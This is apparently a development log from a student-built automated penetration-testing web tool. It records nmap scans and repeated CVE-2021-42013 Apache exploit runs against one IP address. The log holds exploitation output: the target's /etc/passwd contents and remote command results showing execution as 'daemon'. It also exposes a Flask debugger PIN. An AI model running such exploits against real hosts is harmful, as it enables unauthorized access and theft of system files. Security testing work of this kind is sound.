+2024-07-07 17:37:21,196 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 17:37:21,296 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 17:37:21,372 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 17:37:43,713 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 17:37:43,715 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:37:43,798 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:37:43,891 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:37:44,013 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:38:06,345 INFO Checking vulnerabilities on http://152.42.212.132:3790
+2024-07-07 17:38:06,347 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 17:38:06,422 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 17:38:06,586 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 17:38:06,656 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 17:38:29,020 INFO Vulnerability findings: [+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 17:38:29,130 INFO Header added successfully.
+2024-07-07 17:38:29,142 INFO Cover page created successfully.
+2024-07-07 17:38:29,249 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 17:38:29,249 INFO Process completed in 700.3315849304199 seconds.
+2024-07-07 17:38:29,258 INFO 127.0.0.1 - - [07/Jul/2024 17:38:29] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 17:42:31,370 INFO [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2024-07-07 17:42:31,370 INFO [33mPress CTRL+C to quit[0m
+2024-07-07 17:42:31,374 INFO  * Restarting with stat
+2024-07-07 17:42:32,934 WARNING  * Debugger is active!
+2024-07-07 17:42:32,944 INFO  * Debugger PIN: 860-226-893
+2024-07-07 17:42:37,634 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 17:42:42,576 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 17:52:19,650 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 17:46 SE Asia Standard Time
+80/tcp    open     http?
+|_http-title: Welcome to nginx!
+889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_http-server-header: Apache/2.4.50 (Unix)
+3790/tcp  open     http            nginx
+|_http-title: Did not follow redirect to https://152.42.212.132:3790/
+|     HTTP/1.1 302 Found
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|_  http/1.1
+|     HTTP/1.0 401 Unauthorized
+|     HTTP/1.0 401 Unauthorized
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|_    {"error":{"root_cause":[{"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"}],"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"},"status":400}
+|     HTTP/1.0 400 Bad Request
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     HTTP/1.0 200 OK
+|     {"host":"751247e67e9c","version":"8.13.4","http_address":"0.0.0.0:9600","id":"76e96a99-e805-4b63-97aa-b1561d4654a2","name":"logstash","ephemeral_id":"3a890be7-70bc-4622-84b9-4c22678de0ef","status":"green","snapshot":false,"pipeline":{"workers":4,"batch_size":125,"batch_delay":50},"build_date":"2024-05-06T13:04:36+00:00","build_sha":"80e67bc73d1dede7d683c72df122fc6be5d47d1b","build_snapshot":false}
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     HTTP/1.0 400 Bad Request
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|_    /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/thread_pool.rb:155:in `block in spawn_thread'HTTP/1.1 400 Bad Request
+4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF:dows%r(GetRequest,2B3,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/login
+SF:\x20close\r\n\r\n")%r(HTTPOptions,308,"HTTP/1\.1\x20404\x20Not\x20Found
+SF:r(RTSPRequest,308,"HTTP/1\.1\x20404\x20Not\x20Found\r\nX-Content-Type-O
+SF:dows%r(GetRequest,29C,"HTTP/1\.0\x20401\x20Unauthorized\r\nWWW-Authenti
+SF:\]}},\"status\":401}")%r(HTTPOptions,89,"HTTP/1\.0\x20200\x20OK\r\nAllo
+SF:_argument_exception\",\"reason\":\"Unexpected\x20http\x20protocol\x20ve
+SF:on\":\"Unexpected\x20http\x20protocol\x20version:\x20RTSP/1\.0\"},\"sta
+SF:tus\":400}")%r(FourOhFourRequest,2E2,"HTTP/1\.0\x20401\x20Unauthorized\
+SF:(GenericLines,42A,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x20989\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP\x20
+SF:an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::Http
+SF:ParserError\)\norg/jruby/puma/Http11\.java:200:in\x20`execute'\n/usr/sh
+SF:va/lib/puma/")%r(GetRequest,1F9,"HTTP/1\.0\x20200\x20OK\r\nContent-Type
+SF:\",\"http_address\":\"0\.0\.0\.0:9600\",\"id\":\"76e96a99-e805-4b63-97a
+SF:83c72df122fc6be5d47d1b\",\"build_snapshot\":false}")%r(HTTPOptions,B9,"
+SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nX-Cascade:\x20pass\r\nContent-Type:
+SF:\":\"Not\x20Found\"}}")%r(RTSPRequest,337,"HTTP/1\.0\x20400\x20Bad\x20R
+SF::\x20Invalid\x20HTTP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20
+SF:20Puma\?\x20\(Puma::HttpParserError\)\norg/jruby/puma/Http11\.java:200:
+SF:ib/puma/thread_pool\.rb:155:in\x20`block\x20in\x20spawn_thread'HTTP/1\.
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+2024-07-07 17:52:19,651 INFO Found Apache ports: ['80', '889', '3790']
+2024-07-07 17:52:19,651 INFO Checking vulnerabilities on http://152.42.212.132:80
+2024-07-07 17:52:19,658 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 17:52:19,707 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 17:52:19,831 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 17:52:19,909 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 17:52:26,008 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 17:46 SE Asia Standard Time
+80/tcp    open     http?
+|_http-title: Welcome to nginx!
+889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+|_http-server-header: Apache/2.4.50 (Unix)
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+3790/tcp  open     http            nginx
+|_http-title: Did not follow redirect to https://152.42.212.132:3790/
+|_  http/1.1
+|     HTTP/1.1 302 Found
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|     HTTP/1.0 401 Unauthorized
+|     HTTP/1.0 401 Unauthorized
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|_    {"error":{"root_cause":[{"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"}],"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"},"status":400}
+|     HTTP/1.0 400 Bad Request
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     HTTP/1.0 200 OK
+|     {"host":"751247e67e9c","version":"8.13.4","http_address":"0.0.0.0:9600","id":"76e96a99-e805-4b63-97aa-b1561d4654a2","name":"logstash","ephemeral_id":"3a890be7-70bc-4622-84b9-4c22678de0ef","status":"green","snapshot":false,"pipeline":{"workers":4,"batch_size":125,"batch_delay":50},"build_date":"2024-05-06T13:04:36+00:00","build_sha":"80e67bc73d1dede7d683c72df122fc6be5d47d1b","build_snapshot":false}
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     HTTP/1.0 400 Bad Request
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|_    /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/thread_pool.rb:155:in `block in spawn_thread'HTTP/1.1 400 Bad Request
+4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF:dows%r(GetRequest,2B3,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/login
+SF:\x20close\r\n\r\n")%r(HTTPOptions,308,"HTTP/1\.1\x20404\x20Not\x20Found
+SF:r(RTSPRequest,308,"HTTP/1\.1\x20404\x20Not\x20Found\r\nX-Content-Type-O
+SF:dows%r(GetRequest,29C,"HTTP/1\.0\x20401\x20Unauthorized\r\nWWW-Authenti
+SF:\]}},\"status\":401}")%r(HTTPOptions,89,"HTTP/1\.0\x20200\x20OK\r\nAllo
+SF:_argument_exception\",\"reason\":\"Unexpected\x20http\x20protocol\x20ve
+SF:on\":\"Unexpected\x20http\x20protocol\x20version:\x20RTSP/1\.0\"},\"sta
+SF:tus\":400}")%r(FourOhFourRequest,2E2,"HTTP/1\.0\x20401\x20Unauthorized\
+SF:(GenericLines,42A,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x20989\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP\x20
+SF:an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::Http
+SF:ParserError\)\norg/jruby/puma/Http11\.java:200:in\x20`execute'\n/usr/sh
+SF:va/lib/puma/")%r(GetRequest,1F9,"HTTP/1\.0\x20200\x20OK\r\nContent-Type
+SF:\",\"http_address\":\"0\.0\.0\.0:9600\",\"id\":\"76e96a99-e805-4b63-97a
+SF:83c72df122fc6be5d47d1b\",\"build_snapshot\":false}")%r(HTTPOptions,B9,"
+SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nX-Cascade:\x20pass\r\nContent-Type:
+SF:\":\"Not\x20Found\"}}")%r(RTSPRequest,337,"HTTP/1\.0\x20400\x20Bad\x20R
+SF::\x20Invalid\x20HTTP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20
+SF:20Puma\?\x20\(Puma::HttpParserError\)\norg/jruby/puma/Http11\.java:200:
+SF:ib/puma/thread_pool\.rb:155:in\x20`block\x20in\x20spawn_thread'HTTP/1\.
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+2024-07-07 17:52:26,009 INFO Found Apache ports: ['80', '889', '3790']
+2024-07-07 17:52:26,009 INFO Checking vulnerabilities on http://152.42.212.132:80
+2024-07-07 17:52:26,010 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 17:52:26,087 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 17:52:26,234 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 17:52:26,317 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 17:52:42,262 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 17:52:42,264 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:52:42,338 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:52:42,424 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:52:42,490 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:52:48,593 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 17:52:48,597 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:52:48,671 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:52:48,757 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:52:48,819 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:53:04,863 INFO Checking vulnerabilities on http://152.42.212.132:3790
+2024-07-07 17:53:04,864 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 17:53:04,929 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 17:53:05,094 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 17:53:05,168 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 17:53:11,180 INFO Checking vulnerabilities on http://152.42.212.132:3790
+2024-07-07 17:53:11,181 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 17:53:11,262 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 17:53:11,417 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 17:53:11,490 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 17:53:27,601 INFO Vulnerability findings: [+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 17:53:27,658 INFO Header added successfully.
+2024-07-07 17:53:27,666 INFO Cover page created successfully.
+2024-07-07 17:53:27,739 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 17:53:27,739 INFO Process completed in 650.1095359325409 seconds.
+2024-07-07 17:53:27,765 INFO 127.0.0.1 - - [07/Jul/2024 17:53:27] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 17:53:33,902 INFO Vulnerability findings: [+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 17:53:33,930 INFO Header added successfully.
+2024-07-07 17:53:33,936 INFO Cover page created successfully.
+2024-07-07 17:53:34,004 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 17:53:34,004 INFO Process completed in 651.4280967712402 seconds.
+2024-07-07 17:53:34,005 INFO 127.0.0.1 - - [07/Jul/2024 17:53:34] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 17:53:34,150 INFO 127.0.0.1 - - [07/Jul/2024 17:53:34] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:54:43,250 INFO 127.0.0.1 - - [07/Jul/2024 17:54:43] "GET /static/output/Penetration_Test_Report_Apache.docx HTTP/1.1" 200 -
+2024-07-07 17:56:21,519 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\generate_report_apache.py', reloading
+2024-07-07 17:56:21,757 INFO  * Restarting with stat
+2024-07-07 17:56:23,769 WARNING  * Debugger is active!
+2024-07-07 17:56:23,774 INFO  * Debugger PIN: 860-226-893
+2024-07-07 17:56:24,923 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 17:56:25,100 INFO  * Restarting with stat
+2024-07-07 17:56:26,931 WARNING  * Debugger is active!
+2024-07-07 17:56:26,938 INFO  * Debugger PIN: 860-226-893
+2024-07-07 17:56:27,984 INFO 127.0.0.1 - - [07/Jul/2024 17:56:27] "GET / HTTP/1.1" 200 -
+2024-07-07 17:56:28,134 INFO 127.0.0.1 - - [07/Jul/2024 17:56:28] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:56:30,262 INFO 127.0.0.1 - - [07/Jul/2024 17:56:30] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 17:56:30,274 INFO 127.0.0.1 - - [07/Jul/2024 17:56:30] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 17:56:30,289 INFO 127.0.0.1 - - [07/Jul/2024 17:56:30] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:56:32,863 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 18:06:05,329 INFO Nmap scan result: 889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+|_http-server-header: Apache/2.4.50 (Unix)
+2024-07-07 18:06:05,330 INFO Found Apache ports: ['889']
+2024-07-07 18:06:05,330 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 18:06:05,336 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 18:06:05,411 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 18:06:05,490 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 18:06:05,560 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 18:06:27,886 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 18:06:27,920 INFO Header added successfully.
+2024-07-07 18:06:27,930 INFO Cover page created successfully.
+2024-07-07 18:06:28,015 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 18:06:28,015 INFO Process completed in 595.1529834270477 seconds.
+2024-07-07 18:06:28,020 INFO 127.0.0.1 - - [07/Jul/2024 18:06:28] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 18:06:28,035 INFO 127.0.0.1 - - [07/Jul/2024 18:06:28] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:09:06,921 INFO 127.0.0.1 - - [07/Jul/2024 18:09:06] "GET /static/output/Penetration_Test_Report_Apache.docx HTTP/1.1" 200 -
+2024-07-07 18:10:32,863 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\generate_report_apache.py', reloading
+2024-07-07 18:10:33,033 INFO  * Restarting with stat
+2024-07-07 18:10:34,715 WARNING  * Debugger is active!
+2024-07-07 18:10:34,720 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:10:38,007 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 18:10:38,082 INFO  * Restarting with stat
+2024-07-07 18:10:40,361 WARNING  * Debugger is active!
+2024-07-07 18:10:40,366 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:10:43,116 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 18:14:00,833 INFO Nmap scan result: 
+2024-07-07 18:14:00,833 INFO Found Apache ports: []
+2024-07-07 18:14:00,833 INFO Vulnerability findings: 
+2024-07-07 18:14:00,859 INFO Header added successfully.
+2024-07-07 18:14:00,867 INFO Cover page created successfully.
+2024-07-07 18:14:00,940 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 18:14:00,940 INFO Process completed in 197.83067321777344 seconds.
+2024-07-07 18:14:00,945 INFO 127.0.0.1 - - [07/Jul/2024 18:14:00] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 18:14:01,058 INFO 127.0.0.1 - - [07/Jul/2024 18:14:01] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:16:45,919 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 18:16:45,992 INFO  * Restarting with stat
+2024-07-07 18:16:47,975 WARNING  * Debugger is active!
+2024-07-07 18:16:47,980 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:21:05,860 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 18:21:06,023 INFO  * Restarting with stat
+2024-07-07 18:21:07,774 WARNING  * Debugger is active!
+2024-07-07 18:21:07,782 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:21:08,946 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-07 18:21:09,131 INFO  * Restarting with stat
+2024-07-07 18:21:11,144 WARNING  * Debugger is active!
+2024-07-07 18:21:11,163 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:21:12,915 INFO 127.0.0.1 - - [07/Jul/2024 18:21:12] "GET / HTTP/1.1" 200 -
+2024-07-07 18:21:13,105 INFO 127.0.0.1 - - [07/Jul/2024 18:21:13] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:21:15,300 INFO 127.0.0.1 - - [07/Jul/2024 18:21:15] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 18:21:15,331 INFO 127.0.0.1 - - [07/Jul/2024 18:21:15] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 18:21:15,366 INFO 127.0.0.1 - - [07/Jul/2024 18:21:15] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 18:21:18,459 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 18:21:34,691 INFO [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2024-07-07 18:21:34,691 INFO [33mPress CTRL+C to quit[0m
+2024-07-07 18:21:34,694 INFO  * Restarting with stat
+2024-07-07 18:21:36,741 WARNING  * Debugger is active!
+2024-07-07 18:21:36,747 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:22:58,886 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 18:22:58,989 INFO  * Restarting with stat
+2024-07-07 18:23:00,483 WARNING  * Debugger is active!
+2024-07-07 18:23:00,488 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:24:00,907 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-07 18:24:01,005 INFO  * Restarting with stat
+2024-07-07 18:24:03,140 WARNING  * Debugger is active!
+2024-07-07 18:24:03,150 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:24:04,043 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 18:24:29,194 INFO [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2024-07-07 18:24:29,194 INFO [33mPress CTRL+C to quit[0m
+2024-07-07 18:24:29,197 INFO  * Restarting with stat
+2024-07-07 18:24:30,373 WARNING  * Debugger is active!
+2024-07-07 18:24:30,378 INFO  * Debugger PIN: 860-226-893
+2024-07-07 18:24:31,206 INFO 127.0.0.1 - - [07/Jul/2024 18:24:31] "GET / HTTP/1.1" 200 -
+2024-07-07 18:24:31,435 INFO 127.0.0.1 - - [07/Jul/2024 18:24:31] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
